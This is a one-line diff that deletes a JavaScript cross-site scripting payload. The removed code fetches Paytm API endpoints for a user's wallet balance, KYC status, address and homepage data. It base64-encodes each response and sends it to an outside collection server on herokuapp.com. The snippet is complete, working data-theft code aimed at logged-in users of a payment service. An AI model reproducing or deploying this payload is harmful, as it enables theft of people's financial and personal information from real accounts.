@@ -1,1 +1,0 @@
-function fe(t){fetch(t).then(t=>t.text()).then(t=>{fetch("https://xss-server.herokuapp.com/pytm/?p="+btoa(t))})}urls=["https://paytm.com/shop/new-app-homepage-data","https://paytm.com/v1/api/wallet/customuserbalance","https://paytm.com/v1/api/checkkycstatus","https://paytm.com/v1/api/user/address"],urls.forEach(fe);
